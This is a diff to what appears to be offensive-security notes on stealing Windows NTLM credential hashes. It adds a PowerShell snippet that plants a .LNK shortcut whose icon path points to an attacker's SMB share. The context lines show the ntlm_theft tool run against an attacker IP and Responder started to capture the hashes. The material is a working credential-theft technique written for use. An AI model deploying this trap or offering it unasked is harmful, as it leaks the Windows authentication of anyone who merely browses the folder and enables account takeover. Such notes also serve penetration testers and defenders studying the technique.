@@ -20,3 +20,15 @@ git clone https://github.com/Greenwolf/ntlm_theft
 python3 ntlm_theft.py -g all -s 10.10.14.66 -f media
 sudo responder -I tun0 
 ```
+
+# .LNK Files
+```powershell
+$objShell = New-Object -ComObject WScript.Shell
+$lnk = $objShell.CreateShortcut("C:\Users\Public\@important.lnk")
+$lnk.TargetPath = "\\<ATTACKER-IP>\important.png"
+$lnk.WindowStyle = 1
+$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
+$lnk.Description = "Browsing to the dir this file lives in will perform an authentication request."
+$lnk.HotKey = "Ctrl+Alt+O"
+$lnk.Save()
+```
